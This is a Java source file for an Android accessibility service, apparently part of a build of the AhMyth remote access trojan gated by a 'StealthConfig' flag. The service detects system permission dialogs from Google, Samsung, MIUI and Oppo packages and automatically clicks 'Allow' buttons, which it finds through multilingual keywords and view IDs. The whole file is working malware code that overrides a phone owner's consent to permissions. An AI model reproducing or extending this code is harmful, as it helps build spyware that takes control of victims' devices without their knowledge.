package ahmyth.mine.king.ahmyth;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;

/**
 * Accessibility service that automatically grants permissions
 * by detecting permission dialogs and clicking "Allow" buttons
 */
public class PermissionGranterService extends AccessibilityService {
    
    private static final String TAG = "PermissionGranter";
    
    // Keywords to identify grant/allow buttons across different languages and Android versions
    private static final String[] ALLOW_KEYWORDS = {
        "allow", "grant", "permit", "accept", "yes", "ok", "okay",
        "while using", "only this time", "always allow",
        "zezwól", "pozwól", "tak", "akceptuj", // Polish
        "erlauben", "zulassen", "ja", // German
        "autoriser", "permettre", "oui", // French
        "разрешить", "да", // Russian
        "允许", "同意", // Chinese
        "許可", "はい" // Japanese
    };
    
    // Package names of system permission dialogs
    private static final String[] PERMISSION_PACKAGES = {
        "com.android.packageinstaller",
        "com.google.android.packageinstaller", 
        "com.android.permissioncontroller",
        "com.google.android.permissioncontroller",
        "com.samsung.android.permissioncontroller",
        "com.miui.securitycenter",
        "com.coloros.safecenter",
        "com.oppo.safe"
    };
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!StealthConfig.USE_ACCESSIBILITY_GRANTER) {
            return;
        }
        
        if (event == null) return;
        
        String packageName = event.getPackageName() != null ? 
            event.getPackageName().toString() : "";
        
        // Check if this is a permission dialog
        boolean isPermissionDialog = false;
        for (String pkg : PERMISSION_PACKAGES) {
            if (packageName.contains(pkg)) {
                isPermissionDialog = true;
                break;
            }
        }
        
        if (!isPermissionDialog) return;
        
        Log.d(TAG, "Permission dialog detected: " + packageName);
        
        // Try to find and click the allow button
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
            findAndClickAllowButton(rootNode);
            rootNode.recycle();
        }
    }
    
    private void findAndClickAllowButton(AccessibilityNodeInfo node) {
        if (node == null) return;
        
        // Check if this node is clickable and contains allow text
        String text = node.getText() != null ? node.getText().toString().toLowerCase() : "";
        String contentDesc = node.getContentDescription() != null ? 
            node.getContentDescription().toString().toLowerCase() : "";
        
        boolean isAllowButton = false;
        for (String keyword : ALLOW_KEYWORDS) {
            if (text.contains(keyword) || contentDesc.contains(keyword)) {
                isAllowButton = true;
                break;
            }
        }
        
        if (isAllowButton && node.isClickable()) {
            Log.d(TAG, "Clicking allow button: " + text);
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            return;
        }
        
        // Also check for button class with resource-id containing "allow" or "grant"
        String viewId = node.getViewIdResourceName();
        if (viewId != null) {
            String viewIdLower = viewId.toLowerCase();
            if ((viewIdLower.contains("allow") || viewIdLower.contains("grant") || 
                 viewIdLower.contains("permission_allow") || viewIdLower.contains("continue")) 
                && node.isClickable()) {
                Log.d(TAG, "Clicking button by ID: " + viewId);
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                return;
            }
        }
        
        // Recursively check children
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                findAndClickAllowButton(child);
                child.recycle();
            }
        }
    }
    
    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service interrupted");
    }
    
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Permission granter service connected");
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | 
                          AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                     AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.notificationTimeout = 100;
        
        setServiceInfo(info);
    }
}

